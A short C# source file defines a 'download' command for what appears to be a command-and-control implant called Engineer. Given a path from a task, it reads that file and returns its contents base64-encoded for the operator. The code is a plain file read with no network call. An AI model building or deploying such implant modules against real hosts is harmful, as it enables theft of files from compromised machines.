using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Download : EngineerCommand
    {
        public override string Name => "download";

        public override string Execute(EngineerTask task)
        {
            //read file from file string as a byte array and return it
            if (task.Arguments.TryGetValue("/file", out string file))
            {
                byte[] content = File.ReadAllBytes(file);
                return Convert.ToBase64String(content);
            }
            return "error: " + "Failed to read file content for download";

        }
    }
}
